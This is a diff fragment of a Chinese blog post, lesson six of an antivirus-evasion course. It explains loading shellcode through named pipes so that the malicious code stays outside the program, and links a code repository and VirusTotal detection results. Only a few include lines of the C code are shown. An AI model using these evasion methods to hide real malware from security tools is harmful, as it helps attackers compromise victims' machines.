+<span>倾旋</span></div></header><section><h2 id=0x01-分离免杀>0x01 分离免杀</h2><p>前五课的代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><p>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</p><p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p><h2 id=0x02-管道>0x02 管道</h2><p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p><p>先展开本地管道来讲解：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;intrin.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
@@ -185,4 +193,4 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>本实例主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p><p><img src=https://images.payloads.online/7a187ec0-4f5f-11ec-8af3-00d861bf4abb.png alt=2019-11-10-02-07-41></p><p>V站结果：https://www.virustotal.com/gui/file/b81f3d2e6b72f908c861b0b6e1f504af33ef60825b36af3d21bfe90fce160ae4/detection</p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>
+</span></span></code></pre></div><p>本实例主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p><p><img src=https://images.payloads.online/7a187ec0-4f5f-11ec-8af3-00d861bf4abb.png alt=2019-11-10-02-07-41></p><p>V站结果：https://www.virustotal.com/gui/file/b81f3d2e6b72f908c861b0b6e1f504af33ef60825b36af3d21bfe90fce160ae4/detection</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2019-11-10/5/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>静态恶意代码逃逸（第五课）</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2019-10-02/1/><span>DllMain与rundll32详解</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
